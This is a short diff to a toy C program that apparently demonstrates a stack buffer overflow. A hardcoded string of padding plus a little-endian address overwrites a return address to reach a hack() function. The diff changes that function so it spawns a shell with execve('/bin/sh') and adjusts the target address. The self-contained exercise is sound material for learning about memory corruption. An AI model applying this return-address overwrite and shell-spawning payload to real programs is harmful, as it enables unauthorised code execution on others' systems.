@@ -8,15 +8,16 @@ void auth(char* src)
 }
 void hack()
 {
+
 	printf("miao! miao! miao!\n");
 	printf("The big cat has stolen your fish!\n");
-	while(1);
+  	execve("/bin/sh",NULL, NULL);
 	return;
 }
 int main()
 {
 	printf("address of hack:%p\n",hack);
-	char* src = "aaaaaaaaaaaa\xc8\x84\x04\x08";
+	char* src = "aaaaaaaaaaaa\xf8\x84\x04\x08";
 	auth(src);
 	return 0;
 }
